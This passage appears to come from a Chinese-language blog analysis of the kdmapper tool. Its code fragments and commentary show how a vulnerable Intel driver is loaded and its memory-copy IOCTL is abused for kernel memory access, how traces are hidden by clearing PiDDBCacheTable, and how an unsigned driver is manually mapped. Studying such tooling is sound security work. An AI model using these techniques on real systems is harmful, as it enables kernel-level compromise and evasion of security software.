class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!intel_driver::<span class="built_in">Load</span>()) &#123;</span><br><span class="line"><span class="built_in">PauseIfParentIsExplorer</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">std::vector&lt;<span class="type">uint8_t</span>&gt; raw_image = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">if</span> (!utils::<span class="built_in">ReadFileToMemory</span>(driver_path, &amp;raw_image)) &#123;</span><br><span class="line"><span class="built_in">Log</span>(<span class="string">L&quot;[-] Failed to read image to memory&quot;</span> &lt;&lt; std::endl);</span><br><span class="line">intel_driver::<span class="built_in">Unload</span>();</span><br><span class="line"><span class="built_in">PauseIfParentIsExplorer</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">kdmapper::AllocationMode mode = kdmapper::AllocationMode::AllocatePool;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (indPagesMode) &#123;</span><br><span class="line">mode = kdmapper::AllocationMode::AllocateIndependentPages;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS exitCode = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (!kdmapper::<span class="built_in">MapDriver</span>(raw_image.<span class="built_in">data</span>(), <span class="number">0</span>, <span class="number">0</span>, free, !copyHeader, mode, passAllocationPtr, callbackExample, &amp;exitCode)) &#123;</span><br><span class="line"><span class="built_in">Log</span>(<span class="string">L&quot;[-] Failed to map &quot;</span> &lt;&lt; driver_path &lt;&lt; std::endl);</span><br><span class="line">intel_driver::<span class="built_in">Unload</span>();</span><br><span class="line"><span class="built_in">PauseIfParentIsExplorer</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!intel_driver::<span class="built_in">Unload</span>()) &#123;</span><br><span class="line"><span class="built_in">Log</span>(<span class="string">L&quot;[-] Warning failed to fully unload vulnerable driver &quot;</span> &lt;&lt; std::endl);</span><br><span class="line"><span class="built_in">PauseIfParentIsExplorer</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Log</span>(<span class="string">L&quot;[+] success&quot;</span> &lt;&lt; std::endl);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><h3 id="设置未处理异常过滤器"><a href="#设置未处理异常过滤器" class="headerlink" title="设置未处理异常过滤器"></a>设置未处理异常过滤器</h3><p>第一行写了异常处理器，用于处理崩溃情况信息。</p><p>SetUnhandledExceptionFilter(SimplestCrashHandler);</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LONG WINAPI <span class="title">SimplestCrashHandler</span><span class="params">(EXCEPTION_POINTERS* ExceptionInfo)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (ExceptionInfo &amp;&amp; ExceptionInfo-&gt;ExceptionRecord)</span><br><span class="line"><span class="built_in">Log</span>(<span class="string">L&quot;[!!] Crash at addr 0x&quot;</span> &lt;&lt; ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionAddress &lt;&lt; <span class="string">L&quot; by 0x&quot;</span> &lt;&lt; std::hex &lt;&lt; ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode &lt;&lt; std::endl);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">Log</span>(<span class="string">L&quot;[!!] Crash&quot;</span> &lt;&lt; std::endl);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (intel_driver::hDevice)</span><br><span class="line">intel_driver::<span class="built_in">Unload</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> EXCEPTION_EXECUTE_HANDLER;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="解析命令行参数"><a href="#解析命令行参数" class="headerlink" title="解析命令行参数"></a>解析命令行参数</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">wmain</span><span class="params">(<span class="type">const</span> <span class="type">int</span> argc, <span class="type">wchar_t</span>** argv)</span> </span>&#123;</span><br><span class="line"><span class="built_in">SetUnhandledExceptionFilter</span>(SimplestCrashHandler);</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> free = <span class="built_in">paramExists</span>(argc, argv, <span class="string">L&quot;free&quot;</span>) &gt; <span class="number">0</span>;</span><br><span class="line"><span class="type">bool</span> indPagesMode = <span class="built_in">paramExists</span>(argc, argv, <span class="string">L&quot;indPages&quot;</span>) &gt; <span class="number">0</span>;</span><br><span class="line"><span class="type">bool</span> passAllocationPtr = <span class="built_in">paramExists</span>(argc, argv, <span class="string">L&quot;PassAllocationPtr&quot;</span>) &gt; <span class="number">0</span>;</span><br><span class="line"><span class="type">bool</span> copyHeader = <span class="built_in">paramExists</span>(argc, argv, <span class="string">L&quot;copy-header&quot;</span>) &gt; <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (free) &#123;</span><br><span class="line"><span class="built_in">Log</span>(<span class="string">L&quot;[+] Free pool memory after usage enabled&quot;</span> &lt;&lt; std::endl);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (indPagesMode) &#123;</span><br><span class="line"><span class="built_in">Log</span>(<span class="string">L&quot;[+] Allocate Independent Pages mode enabled&quot;</span> &lt;&lt; std::endl);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (free &amp;&amp; indPagesMode) &#123;</span><br><span class="line"><span class="built_in">Log</span>(<span class="string">L&quot;[-] Can&#x27;t use --free and --indPages at the same time&quot;</span> &lt;&lt; std::endl);</span><br><span class="line"><span class="built_in">help</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (passAllocationPtr) &#123;</span><br><span class="line"><span class="built_in">Log</span>(<span class="string">L&quot;[+] Pass Allocation Ptr as first param enabled&quot;</span> &lt;&lt; std::endl);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (copyHeader) &#123;</span><br><span class="line"><span class="built_in">Log</span>(<span class="string">L&quot;[+] Copying driver header enabled&quot;</span> &lt;&lt; std::endl);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PDB_OFFSETS</span></span><br><span class="line"><span class="type">bool</span> UpdateOffset = !(<span class="built_in">paramExists</span>(argc, argv, <span class="string">L&quot;dontUpdateOffsets&quot;</span>) &gt; <span class="number">0</span>);</span><br><span class="line"><span class="type">int</span> FilePathParamIdx = <span class="built_in">paramExists</span>(argc, argv, <span class="string">L&quot;offsetsPath&quot;</span>);</span><br><span class="line">std::wstring offsetFilePath = utils::<span class="built_in">GetCurrentAppFolder</span>() + <span class="string">L&quot;\\offsets.ini&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (UpdateOffset &amp;&amp; FilePathParamIdx &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">Log</span>(<span class="string">&quot;[-] Can&#x27;t set --offsetsPath without set --dontUpdateOffsets&quot;</span> &lt;&lt; std::endl);</span><br><span class="line"><span class="built_in">help</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (FilePathParamIdx &gt; <span class="number">0</span>) &#123;</span><br><span class="line">offsetFilePath = argv[FilePathParamIdx + <span class="number">1</span>];</span><br><span class="line"><span class="built_in">Log</span>(<span class="string">&quot;[+] Setting Offsets File Path To: &quot;</span> &lt;&lt; offsetFilePath &lt;&lt; std::endl);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> drvIndex = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; argc; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (std::filesystem::<span class="built_in">path</span>(argv[i]).<span class="built_in">extension</span>().<span class="built_in">string</span>().<span class="built_in">compare</span>(<span class="string">&quot;.sys&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">drvIndex = i;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (drvIndex &lt;= <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">help</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> std::wstring driver_path = argv[drvIndex];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!std::filesystem::<span class="built_in">exists</span>(driver_path)) &#123;</span><br><span class="line"><span class="built_in">Log</span>(<span class="string">L&quot;[-] File &quot;</span> &lt;&lt; driver_path &lt;&lt; <span class="string">L&quot; doesn&#x27;t exist&quot;</span> &lt;&lt; std::endl);</span><br><span class="line"><span class="built_in">PauseIfParentIsExplorer</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PDB_OFFSETS</span></span><br><span class="line"><span class="keyword">if</span> (!KDSymbolsHandler::<span class="built_in">GetInstance</span>()-&gt;<span class="built_in">ReloadFile</span>(offsetFilePath, UpdateOffset ? utils::<span class="built_in">GetCurrentAppFolder</span>() + <span class="string">L&quot;\\&quot;</span> + SYM_FROM_PDB_EXE : <span class="string">L&quot;&quot;</span>)) &#123;</span><br><span class="line"><span class="built_in">Log</span>(<span class="string">L&quot;[-] Error: Failed To Get Symbols Info.&quot;</span> &lt;&lt; std::endl);</span><br><span class="line"><span class="built_in">PauseIfParentIsExplorer</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!intel_driver::<span class="built_in">Load</span>()) &#123;</span><br><span class="line"><span class="built_in">PauseIfParentIsExplorer</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">std::vector&lt;<span class="type">uint8_t</span>&gt; raw_image = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">if</span> (!utils::<span class="built_in">ReadFileToMemory</span>(driver_path, &amp;raw_image)) &#123;</span><br><span class="line"><span class="built_in">Log</span>(<span class="string">L&quot;[-] Failed to read image to memory&quot;</span> &lt;&lt; std::endl);</span><br><span class="line">intel_driver::<span class="built_in">Unload</span>();</span><br><span class="line"><span class="built_in">PauseIfParentIsExplorer</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">kdmapper::AllocationMode mode = kdmapper::AllocationMode::AllocatePool;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (indPagesMode) &#123;</span><br><span class="line">mode = kdmapper::AllocationMode::AllocateIndependentPages;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS exitCode = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (!kdmapper::<span class="built_in">MapDriver</span>(raw_image.<span class="built_in">data</span>(), <span class="number">0</span>, <span class="number">0</span>, free, !copyHeader, mode, passAllocationPtr, callbackExample, &amp;exitCode)) &#123;</span><br><span class="line"><span class="built_in">Log</span>(<span class="string">L&quot;[-] Failed to map &quot;</span> &lt;&lt; driver_path &lt;&lt; std::endl);</span><br><span class="line">intel_driver::<span class="built_in">Unload</span>();</span><br><span class="line"><span class="built_in">PauseIfParentIsExplorer</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!intel_driver::<span class="built_in">Unload</span>()) &#123;</span><br><span class="line"><span class="built_in">Log</span>(<span class="string">L&quot;[-] Warning failed to fully unload vulnerable driver &quot;</span> &lt;&lt; std::endl);</span><br><span class="line"><span class="built_in">PauseIfParentIsExplorer</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Log</span>(<span class="string">L&quot;[+] success&quot;</span> &lt;&lt; std::endl);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后就是检查参数里面的sys结尾的路径，并且#ifdef PDB_OFFSETS，是否定义了这个，看了一圈也没有定义，之后再讨论这个。</p><h3 id="恶意驱动加载"><a href="#恶意驱动加载" class="headerlink" title="恶意驱动加载"></a>恶意驱动加载</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!intel_driver::<span class="built_in">Load</span>()) &#123;</span><br><span class="line"><span class="built_in">PauseIfParentIsExplorer</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250830053448396.png" alt="image-20250830053448396"></p><p>上面就是一些简单的提示，刚开始是驱动是否已经加载上，然后就是查询TEMP文件夹，并且给了一个随机的名字用于每次使用此程序不会重复造成加载不上驱动的情况，为以后创建服务做准备，之后通过下面代码，把程序内置的驱动二进制生成文件。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!utils::<span class="built_in">CreateFileFromMemory</span>(driver_path, <span class="built_in">reinterpret_cast</span>&lt;<span class="type">const</span> <span class="type">char</span>*&gt;(intel_driver_resource::driver), <span class="built_in">sizeof</span>(intel_driver_resource::driver))) &#123;</span><br><span class="line"><span class="built_in">Log</span>(<span class="string">L&quot;[-] Failed to create vulnerable driver file&quot;</span> &lt;&lt; std::endl);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250830054202804.png" alt="image-20250830054202804"></p><h4 id="启用调试特权"><a href="#启用调试特权" class="headerlink" title="启用调试特权"></a>启用调试特权</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="built_in">AcquireDebugPrivilege</span>()) &#123;</span><br><span class="line"><span class="built_in">Log</span>(<span class="string">L&quot;[-] Failed to acquire SeDebugPrivilege&quot;</span> &lt;&lt; std::endl);</span><br><span class="line">_wremove(driver_path.<span class="built_in">c_str</span>());</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="加载驱动"><a href="#加载驱动" class="headerlink" title="加载驱动"></a>加载驱动</h4><pre><code>if (!service::RegisterAndStart(driver_path, GetDriverNameW())) &#123;Log(L&quot;[-] Failed to register and start service for the vulnerable driver&quot; &lt;&lt; std::endl);_wremove(driver_path.c_str());return false;&#125;</code></pre><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250830055348233.png" alt="image-20250830055348233"></p><h4 id="打开驱动句柄"><a href="#打开驱动句柄" class="headerlink" title="打开驱动句柄"></a>打开驱动句柄</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">hDevice = <span class="built_in">CreateFileW</span>(</span><br><span class="line">    <span class="string">L&quot;\\\\.\\Nal&quot;</span>,                <span class="comment">// 设备名称</span></span><br><span class="line">    GENERIC_READ | GENERIC_WRITE, <span class="comment">// 访问权限（读写）</span></span><br><span class="line">    <span class="number">0</span>,                            <span class="comment">// 共享模式（不共享）</span></span><br><span class="line">    <span class="literal">nullptr</span>,                      <span class="comment">// 安全属性（默认）</span></span><br><span class="line">    OPEN_EXISTING,                <span class="comment">// 打开方式（必须已存在）</span></span><br><span class="line">    FILE_ATTRIBUTE_NORMAL,        <span class="comment">// 文件属性（普通）</span></span><br><span class="line">    <span class="literal">NULL</span>                          <span class="comment">// 模板文件（无）</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250830055846938.png" alt="image-20250830055846938"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250830055828886.png" alt="image-20250830055828886"></p><h4 id="获取ntoskrnl-exe的基地址"><a href="#获取ntoskrnl-exe的基地址" class="headerlink" title="获取ntoskrnl.exe的基地址"></a>获取ntoskrnl.exe的基地址</h4><p>这一步是不是熟悉了，跟上篇文章一样，要找这个ntoskrnl.exe的基地址。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ntoskrnlAddr = utils::<span class="built_in">GetKernelModuleAddress</span>(<span class="string">&quot;ntoskrnl.exe&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (ntoskrnlAddr == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">Log</span>(<span class="string">L&quot;[-] Failed to get ntoskrnl.exe&quot;</span> &lt;&lt; std::endl);</span><br><span class="line">intel_driver::<span class="built_in">Unload</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="读取ntoskrnl-exe"><a href="#读取ntoskrnl-exe" class="headerlink" title="读取ntoskrnl.exe"></a>读取ntoskrnl.exe</h4><p>这里突然读取，还是自定义的读取函数，我们来看看怎么个事。跟踪调用链。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//check MZ ntoskrnl.exe</span></span><br><span class="line">IMAGE_DOS_HEADER dosHeader = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">if</span> (!intel_driver::<span class="built_in">ReadMemory</span>(intel_driver::ntoskrnlAddr, &amp;dosHeader, <span class="built_in">sizeof</span>(IMAGE_DOS_HEADER)) || dosHeader.e_magic != IMAGE_DOS_SIGNATURE) &#123;</span><br><span class="line"><span class="built_in">Log</span>(<span class="string">L&quot;[-] Can&#x27;t exploit intel driver, is there any antivirus or anticheat running?&quot;</span> &lt;&lt; std::endl);</span><br><span class="line">intel_driver::<span class="built_in">Unload</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">intel_driver::ReadMemory</span><span class="params">(<span class="type">uint64_t</span> address, <span class="type">void</span>* buffer, <span class="type">uint64_t</span> size)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> MemCopy(reinterpret_cast&lt;<span class="type">uint64_t</span>&gt;(buffer), address, size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">intel_driver::MemCopy</span><span class="params">(<span class="type">uint64_t</span> destination, <span class="type">uint64_t</span> source, <span class="type">uint64_t</span> size)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (!destination || !source || !size)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">COPY_MEMORY_BUFFER_INFO copy_memory_buffer = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">copy_memory_buffer.case_number = <span class="number">0x33</span>;</span><br><span class="line">copy_memory_buffer.source = source;</span><br><span class="line">copy_memory_buffer.destination = destination;</span><br><span class="line">copy_memory_buffer.length = size;</span><br><span class="line"></span><br><span class="line">DWORD bytes_returned = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> DeviceIoControl(hDevice, ioctl1, &amp;copy_memory_buffer, <span class="keyword">sizeof</span>(copy_memory_buffer), nullptr, <span class="number">0</span>, &amp;bytes_returned, nullptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们发现通过驱动通信（IOCTL）实现 <strong>内核到用户态的内存复制</strong>。然后进行判断是否pe文件，如果读取失败，就是驱动加载有问题。</p><h4 id="IOCTL"><a href="#IOCTL" class="headerlink" title="IOCTL"></a>IOCTL</h4><p>来个小插曲，驱动通信内存复制。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">constexpr</span> ULONG32 ioctl1 = <span class="number">0x80862007</span>;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">DeviceIoControl</span>(hDevice, ioctl1, &amp;copy_memory_buffer, <span class="built_in">sizeof</span>(copy_memory_buffer), <span class="literal">nullptr</span>, <span class="number">0</span>, &amp;bytes_returned, <span class="literal">nullptr</span>);</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250830061041239.png" alt="image-20250830061041239"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy_memory_buffer.case_number = <span class="number">0x33</span>;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250830061132974.png" alt="image-20250830061132974"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250830061149185.png" alt="image-20250830061149185"></p><p><strong>用户态调用 <code>DeviceIoControl</code>时，IRQL 始终是 <code>PASSIVE_LEVEL</code>（0）</strong>，因此 <strong><code>KeGetCurrentIrql() &lt;= 2</code>的验证一定会通过</strong></p><h4 id="隐藏驱动加载痕迹"><a href="#隐藏驱动加载痕迹" class="headerlink" title="隐藏驱动加载痕迹"></a>隐藏驱动加载痕迹</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!intel_driver::ClearPiDDBCacheTable()) &#123;</span><br><span class="line">Log(<span class="string">L&quot;[-] Failed to ClearPiDDBCacheTable&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>);</span><br><span class="line">intel_driver::Unload();</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250830062024394.png" alt="image-20250830062024394"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/5f365f67bf41998eae457b0cadb324cb.png" alt="img"></p><h3 id="读取恶意驱动文件到内存"><a href="#读取恶意驱动文件到内存" class="headerlink" title="读取恶意驱动文件到内存"></a>读取恶意驱动文件到内存</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">uint8_t</span>&gt; raw_image = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">if</span> (!utils::ReadFileToMemory(driver_path, &amp;raw_image)) &#123;</span><br><span class="line">Log(<span class="string">L&quot;[-] Failed to read image to memory&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>);</span><br><span class="line">intel_driver::Unload();</span><br><span class="line">PauseIfParentIsExplorer();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="内存分配模式∙"><a href="#内存分配模式∙" class="headerlink" title="内存分配模式∙"></a>内存分配模式∙</h4><p>AllocationMode::AllocatePool 默认模式，使用内核的 分页内存池（Paged Pool） 分配连续内存。<br>AllocationMode::AllocateIndependentPages 如果 indPagesMode为 true，则改用 独立物理页（Independent Pages） 分配非连续内存。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kdmapper::AllocationMode mode = kdmapper::AllocationMode::AllocatePool;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (indPagesMode) &#123;</span><br><span class="line">mode = kdmapper::AllocationMode::AllocateIndependentPages;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="内存加载驱动"><a href="#内存加载驱动" class="headerlink" title="内存加载驱动"></a>内存加载驱动</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">NTSTATUS exitCode = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> 